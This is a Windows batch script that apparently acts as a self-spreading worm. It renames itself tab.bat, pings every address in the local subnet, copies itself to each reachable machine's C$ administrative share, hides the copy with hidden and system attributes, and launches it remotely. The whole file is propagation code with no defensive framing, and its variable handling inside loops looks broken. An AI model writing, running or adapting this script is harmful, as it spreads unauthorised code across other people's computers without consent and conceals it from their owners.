@echo off
setlocal enableextensions

rem Get the name of the current script
set scriptName=%~nx0

rem Check if the script name is not tab.bat
if not "%scriptName%"=="tab.bat" (
    rem Rename the script to tab.bat
    ren "%scriptName%" tab.bat
)

rem Get the local IP address of the current computer
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /r "IPv4.*:"') do set "IP=%%a"

rem Get the network prefix of the current IP address
set "networkPrefix=%IP:~0,-3%"

rem Loop through all possible IP addresses in the same network
for /l %%i in (1,1,255) do (
    set "remoteIP=%networkPrefix%.%%i"
    rem Check if the remote IP address is online
    ping -n 1 -w 100 %remoteIP% >nul 2>&1
    if not errorlevel 1 (
        rem Check if the tab.bat file already exists on the remote computer
        if not exist \\%remoteIP%\C$\tab.bat (
            rem Copy the tab.bat file to the remote computer
            xcopy /y "tab.bat" \\%remoteIP%\C$\
            echo File tab.bat copied to: \\%remoteIP%\C$\
            rem Give the tab.bat script the hidden and system file attributes
            attrib +h +s \\%remoteIP%\C$\tab.bat
            rem Run the tab.bat script
            start \\%remoteIP%\C$\tab.bat
        ) else (
            echo File tab.bat already exists on \\%remoteIP%\C$\
        )
    )
)

rem Check if any remote computers were found
if "%remoteIP%"=="" (
    echo No other computers on the same wifi network were found
)

endlocal
